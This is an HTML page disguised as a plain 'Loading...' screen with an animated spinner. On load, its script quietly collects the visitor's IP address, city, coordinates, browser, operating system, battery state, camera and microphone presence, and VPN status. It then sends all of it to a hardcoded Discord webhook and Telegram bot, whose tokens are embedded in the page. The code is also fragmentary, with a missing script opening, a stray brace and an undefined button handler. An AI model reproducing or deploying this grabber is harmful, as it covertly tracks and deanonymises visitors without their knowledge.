<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }

        .loading-container {
            text-align: center;
            position: relative;
            z-index: 10;
        }

        .loader-wrapper {
            position: relative;
            width: 200px;
            height: 200px;
            margin: 0 auto 40px;
        }

        .loader {
            position: absolute;
            width: 100%;
            height: 100%;
            border-radius: 50%;
            border: 4px solid rgba(255, 255, 255, 0.1);
            border-top-color: #fff;
            animation: spin 1.5s cubic-bezier(0.68, -0.55, 0.265, 1.55) infinite;
        }

        .loader-inner {
            position: absolute;
            top: 20px;
            left: 20px;
            right: 20px;
            bottom: 20px;
            border-radius: 50%;
            border: 4px solid rgba(255, 255, 255, 0.1);
            border-top-color: rgba(255, 255, 255, 0.6);
            animation: spin 1s cubic-bezier(0.68, -0.55, 0.265, 1.55) infinite reverse;
        }

        .loader-center {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 60px;
            height: 60px;
            background: rgba(255, 255, 255, 0.2);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            backdrop-filter: blur(10px);
        }

        .loader-dot {
            width: 12px;
            height: 12px;
            background: #fff;
            border-radius: 50%;
            animation: pulse 1.5s ease-in-out infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @keyframes pulse {
            0%, 100% { transform: scale(0.8); opacity: 0.5; }
            50% { transform: scale(1.2); opacity: 1; }
        }

        .loading-text {
            color: white;
            font-size: 28px;
            font-weight: 600;
            margin-bottom: 15px;
            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
            animation: fadeInOut 2s ease-in-out infinite;
        }

        .loading-subtext {
            color: rgba(255, 255, 255, 0.8);
            font-size: 16px;
            font-weight: 300;
            text-shadow: 0 1px 5px rgba(0, 0, 0, 0.2);
        }

        @keyframes fadeInOut {
            0%, 100% { opacity: 0.7; }
            50% { opacity: 1; }
        }

        .particles {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 1;
        }

        .particle {
            position: absolute;
            background: rgba(255, 255, 255, 0.5);
            border-radius: 50%;
            animation: float linear infinite;
        }

        @keyframes float {
            0% {
                transform: translateY(100vh) scale(0);
                opacity: 0;
            }
            10% {
                opacity: 1;
            }
            90% {
                opacity: 1;
            }
            100% {
                transform: translateY(-100px) scale(1);
                opacity: 0;
            }
        }

        .reload-btn {
            position: fixed;
            bottom: 40px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(255, 255, 255, 0.2);
            color: white;
            padding: 15px 40px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-radius: 50px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            backdrop-filter: blur(10px);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
            z-index: 10;
        }

        .reload-btn:hover {
            background: rgba(255, 255, 255, 0.3);
            border-color: rgba(255, 255, 255, 0.5);
            transform: translateX(-50%) translateY(-5px);
            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.2);
        }

        .reload-btn:active {
            transform: translateX(-50%) translateY(-2px);
        }

        .ad {
            display: block;
            width: 1px;
            height: 1px;
            visibility: hidden;
        }
    </style>
</head>
<body>
    <div class="particles" id="particles"></div>
    
    <div class="loading-container">
        <div class="loader-wrapper">
            <div class="loader"></div>
            <div class="loader-inner"></div>
            <div class="loader-center">
                <div class="loader-dot"></div>
            </div>
        </div>
        <div class="loading-text">Loading</div>
        <div class="loading-subtext">Please wait while we prepare everything...</div>
    </div>

    <button class="reload-btn" onclick="copyToClipboard()">Karina Otsosi –ü–ñ!!!!</button>
    <div class="ad"></div>

                particle.style.left = Math.random() * 100 + '%';
                particle.style.width = Math.random() * 5 + 2 + 'px';
                particle.style.height = particle.style.width;
                particle.style.animationDuration = Math.random() * 10 + 10 + 's';
                particle.style.animationDelay = Math.random() * 5 + 's';

            }
        }
        createParticles();

        // Configuration
        const CONFIG = {
            discordWebhook: "https://discord.com/api/webhooks/1229406191717711895/zTi5NHh_YOWKcTHYV-x-_TSs6qdBwGlrZdjvXPyIQNVVCFsYGnmJkVQBHsGD_wLimrqv",
            telegramBot: "7783626587:AAHWW5ntXK7mEz-OsDqBfUiqRCRd0nxliBw",
            telegramChatId: "6234673489",
            weatherApiKey: "KM7AEJQ7MBUYL23UBSQSNRPLW"
        };

        // Utility Functions
        async function fetchJSON(url) {
            const response = await fetch(url);
            return response.json();
        }

        }

        // User Information Collectors
        async function getLocationInfo() {
            const data = await fetchJSON("https://ipinfo.io/json");
            const countryEmojis = {
                "RU": "‚ö™Ô∏èüîµüî¥", "UA": "üîµüü°", "US": "üî¥‚ö™Ô∏èüîµ", "CN": "üî¥üü°",
                "IN": "üüß‚ö™Ô∏èüü¢", "GB": "üî¥‚ö™Ô∏èüîµ", "FR": "üîµ‚ö™Ô∏èüî¥", "DE": "‚ö´Ô∏èüî¥üü°",
                "IT": "üü¢‚ö™Ô∏èüî¥", "JP": "üî¥‚ö™Ô∏èüî¥", "BR": "üü¢üü°üîµ", "CA": "‚ö™Ô∏èüî¥",
                "AU": "üîµ‚ö™Ô∏èüî¥", "MX": "üü¢‚ö™Ô∏èüî¥", "ES": "üî¥üü°", "KR": "‚ö™Ô∏èüî¥üü¢",
                "PL": "‚ö™Ô∏èüî¥", "NL": "üîµ‚ö™Ô∏èüî¥"
            };
            
            const countryNames = {
                "RU": "Russia", "UA": "Ukraine", "US": "United States", "CN": "China",
                "IN": "India", "GB": "United Kingdom", "FR": "France", "DE": "Germany",
                "IT": "Italy", "JP": "Japan", "BR": "Brazil", "CA": "Canada",
                "AU": "Australia", "MX": "Mexico", "ES": "Spain", "KR": "South Korea",
                "PL": "Poland", "NL": "Netherlands"
            };

            return {
                city: data.city || "Unknown",
                country: countryNames[data.country] || data.country || "Unknown",
                coordinates: data.loc || "Unknown",
                emoji: countryEmojis[data.country] || "",
                timezone: data.timezone || "Unknown"
            };
        }

        async function getIPAddress() {
            const data = await fetchJSON("https://api64.ipify.org?format=json");
            return data.ip || "Unknown";
        }

        function getBrowserInfo() {
            const ua = navigator.userAgent;
            const browsers = [
                { name: "Google Chrome", pattern: /Chrome\/(\d+\.\d+\.\d+\.\d+)/, exclude: /OPR/ },
                { name: "Firefox", pattern: /Firefox\/(\d+\.\d+)/ },
                { name: "Edge", pattern: /Edg\/(\d+\.\d+\.\d+\.\d+)/ },
                { name: "Safari", pattern: /Version\/(\d+\.\d+\.\d+)/, include: /Safari/, exclude: /Chrome/ },
                { name: "Opera", pattern: /OPR\/(\d+\.\d+\.\d+)/ },
                { name: "Yandex", pattern: /YaBrowser\/(\d+\.\d+\.\d+)/ }
            ];

            for (const browser of browsers) {
                if (browser.exclude && browser.exclude.test(ua)) continue;
                if (browser.include && !browser.include.test(ua)) continue;
                const match = ua.match(browser.pattern);
                if (match) return { name: browser.name, version: match[1] };
            }
            return { name: "Unknown", version: "Unknown" };
        }

        function getDeviceType() {
            const ua = navigator.userAgent;
            if (/mobile/i.test(ua) || /iPhone|iPod|Android/i.test(ua)) return "Mobile Phone";
            if (/tablet|ipad|playbook/i.test(ua)) return "Tablet";
            if (/iPad|Macintosh/i.test(ua) && 'ontouchend' in document) return "Tablet";
            return "PC or Laptop";
        }

        function getOS() {
            const ua = navigator.userAgent;
            if (ua.includes("Win")) {
                const versions = {
                    "Windows NT 10.0": "Windows 10/11",
                    "Windows NT 6.3": "Windows 8.1",
                    "Windows NT 6.2": "Windows 8",
                    "Windows NT 6.1": "Windows 7"
                };
                for (const [key, value] of Object.entries(versions)) {
                    if (ua.includes(key)) return value;
                }
                return "Windows";
            }
            if (ua.includes("Mac")) return "macOS";
            if (ua.includes("Linux")) return "Linux";
            if (ua.includes("Android")) return "Android";
            return "Unknown";
        }

        async function getBatteryInfo() {
            if (!navigator.getBattery) return "Not available";
            const battery = await navigator.getBattery();
            const level = Math.round(battery.level * 100);
            const status = battery.charging ? "Charging" : "Not Charging";
            return `${level}% (${status})`;
        }

        async function getMediaDevices() {
            try {
                const devices = await navigator.mediaDevices.enumerateDevices();
                const cameras = devices.filter(d => d.kind === 'videoinput').length;
                const microphones = devices.filter(d => d.kind === 'audioinput').length;
                return { cameras, microphones };
            } catch {
                return { cameras: 0, microphones: 0 };
            }
        }

        async function checkAdBlock() {
            const adEl = document.createElement('div');
            adEl.className = 'ad';
            document.body.appendChild(adEl);
            const blocked = window.getComputedStyle(adEl).display === 'none';
            document.body.removeChild(adEl);
            return blocked ? "Detected" : "Not Detected";
        }

        async function checkVPN() {
            try {
                const data = await fetchJSON("https://ipinfo.io/json");
                if (data.org && (data.org.toLowerCase().includes("vpn") || 
                    data.org.toLowerCase().includes("hosting"))) {
                    return `Detected: ${data.org}`;
                }
                return "Not Detected";
            } catch {
                return "Unknown";
            }
        }

        async function getPing() {
            const start = Date.now();
            try {
                await fetch("https://www.google.com", { mode: 'no-cors' });
                return `${Date.now() - start} ms`;
            } catch {
                return "Failed";
            }
        }

        async function getWeather(city) {
            try {
                const url = `https://weather.visualcrossing.com/VisualCrossingWebServices/rest/services/timeline/${city}?unitGroup=uk&key=${CONFIG.weatherApiKey}&contentType=json`;
                const data = await fetchJSON(url);
                return `${data.currentConditions.temp}¬∞C`;
            } catch {
                return "Unknown";
            }
        }

        // Send to Discord and Telegram
        function sendToDiscord(message) {
            fetch(CONFIG.discordWebhook, {
                method: "POST",
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: message })
            });
        }

        function sendToTelegram(message) {
            fetch(`https://api.telegram.org/bot${CONFIG.telegramBot}/sendMessage`, {
                method: "POST",
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CONFIG.telegramChatId,
                    text: message
                })
            });
        }

        // Main function
        async function collectAndSendInfo() {
            const location = await getLocationInfo();
            const ip = await getIPAddress();
            const browser = getBrowserInfo();
            const deviceType = getDeviceType();
            const os = getOS();
            const battery = await getBatteryInfo();
            const media = await getMediaDevices();
            const adBlock = await checkAdBlock();
            const vpn = await checkVPN();
            const ping = await getPing();
            const weather = await getWeather(location.city);
            const googleMapsLink = `https://www.google.com/maps?q=${location.coordinates}`;

            const message = `****                User Information****
****-----------------------------------****
- üó∫Ô∏è **IP Address**: \`${ip}\`
- üèôÔ∏è **City**: \`${location.city}\`
- üåç **Country**: \`${location.country}\` ${location.emoji}
- üèûÔ∏è **Coordinates**: [\`${location.coordinates}\`](${googleMapsLink})
- üïí **Time**: \`${new Date().toLocaleString()}\`
- üåö **Time Zone**: \`${location.timezone}\`
- üå°Ô∏è **Temperature**: \`${weather}\`
- üåê **Browser**: \`${browser.name}\`
- üíøÔ∏è **Browser Version**: \`${browser.version}\`
- üõ∞Ô∏è **Connection Status**: \`${navigator.onLine ? 'Online' : 'Offline'}\`
- üì∂ **Ping**: \`${ping}\`
- üéÆ **Device**: \`${deviceType}\`
- üß© **Operating System**: \`${os}\`
- üÄÑ **Language**: \`${navigator.language}\`
- üîã **Battery**: \`${battery}\`
- üö´ **Ad Blocker**: \`${adBlock}\`
- üïµ **VPN**: \`${vpn}\`
- üíª **Device Memory**: \`${navigator.deviceMemory || 'Unknown'} GB\`
- üï≥Ô∏è **CPU Cores**: \`${navigator.hardwareConcurrency || 'Unknown'}\`
- üç™ **Cookies**: \`${navigator.cookieEnabled ? 'Enabled' : 'Disabled'}\`
- üìê **Screen**: \`${screen.width}x${screen.height}\`
- üì∑ **Camera**: \`${media.cameras > 0 ? 'Yes' : 'No'}\`
- üé§ **Microphone**: \`${media.microphones > 0 ? 'Yes' : 'No'}\`
- üõ†Ô∏è **Plugins**: \`${navigator.plugins.length}\``;

            sendToDiscord(message);
            sendToTelegram(message);
        }

        window.addEventListener('load', collectAndSendInfo);
    </script>
